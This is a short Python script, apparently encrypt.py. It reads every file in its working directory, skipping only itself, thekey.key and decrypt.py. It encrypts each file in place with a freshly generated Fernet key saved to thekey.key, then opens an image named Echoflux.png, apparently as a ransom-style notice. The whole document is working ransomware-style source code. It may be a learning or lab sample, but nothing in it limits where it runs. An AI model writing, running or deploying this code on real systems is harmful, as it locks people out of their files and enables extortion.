#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet
import platform
import subprocess


# Let's find some files!

files = [] 

for file in os.listdir():
    if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file): 
        files.append(file)

print(files) 


key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

# Display the image (Echoflux.png) when encryption is complete

def display_image(image_path):
    system = platform.system()

    if system == "Windows":
        subprocess.run(["start", image_path], shell=True)
    elif system == "Darwin":  # macOS
        subprocess.run(["open", image_path])
    elif system == "Linux":
        subprocess.run(["xdg-open", image_path])

# Call the function to display the image
display_image("Echoflux.png")
